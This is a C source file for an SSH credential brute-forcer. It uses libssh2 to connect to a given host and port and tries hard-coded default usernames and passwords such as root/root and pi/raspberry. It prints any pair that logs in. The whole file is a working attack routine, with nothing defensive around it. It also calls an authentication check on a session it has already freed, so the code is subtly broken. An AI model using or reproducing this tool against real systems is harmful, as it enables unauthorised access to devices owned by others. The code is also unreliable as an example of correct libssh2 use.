#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libssh2.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

int total_open_host;
int total_found;
int running_threads;

struct args {
	char* ip;
	uint16_t port;
};

const char *username[] = {
	"root", "admin", "pi", "raspberry"
};

const char *password[] = {
	"root", "admin", "password", "raspberry", "pi"
};

void* brute(void *input) {

	struct args *data;
	data = (struct args*)input;
	update_pid(data->ip);
	running_threads++;

	for(int n = 0; n < sizeof(username)/sizeof(username[0]); n++) {

		for(int i = 0; i < sizeof(password)/sizeof(password[0]); i++) {

			int sock = socket(AF_INET, SOCK_STREAM, 0);

			if(sock == -1) {
				//printf("Socket fucked\n");
				update_done(data->ip);
				running_threads--;
      				return NULL;
  			}

			struct sockaddr_in sin;

			sin.sin_family = AF_INET;
			sin.sin_port = htons(data->port);
			sin.sin_addr.s_addr = inet_addr(data->ip);

  			if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {
				//printf("Connect fucked\n");
				close(sock);
				update_done(data->ip);
				running_threads--;
				return NULL;
			}

  			LIBSSH2_SESSION *session = libssh2_session_init();

  			if(!session) {
				//printf("Session fucked\n");
				close(sock);
				update_done(data->ip);
				running_threads--;
			 	return NULL;
			}

			update_session(data->ip, session);

			libssh2_session_set_timeout(session, 5000);

  			int rc = libssh2_session_handshake(session, sock);

  			if(rc){
				//printf("Handshake fucked\n");
				libssh2_session_free(session);
				update_session(data->ip, NULL);
			        close(sock);
				update_done(data->ip);
				running_threads--;
			  	return NULL;
			}

			char *authlist = libssh2_userauth_list(session, username[n], strlen(username[n]));

			if(authlist != NULL && strstr(authlist, "password") == NULL) {
				//printf("No password auth allowed for user, skipping\n");
				libssh2_session_free(session);
        			close(sock);
				update_session(data->ip, NULL);
				update_entry(data->ip);
				break;
			}

			rc = libssh2_userauth_password(session, username[n], password[i]);

  			if(!rc) {
				libssh2_session_free(session);
  				close(sock);
					if(libssh2_userauth_authenticated(session)) {
    						printf("\x1b[32mFOUND \x1b[37m-> %s:%s @ %s:%u\n", username[n], password[i], ((struct args*)input)->ip, ((struct args*)input)->port);
						total_found++;
					}
				total_open_host++;
				update_session(data->ip, NULL);
				update_entry(data->ip);
				update_done(data->ip);
				running_threads--;
				return NULL;
  			}

  			libssh2_session_free(session);
  			close(sock);
			update_session(data->ip, NULL);
			update_entry(data->ip);
  		}
	}
	total_open_host++;
	update_done(data->ip);
	running_threads--;
	return NULL;
}
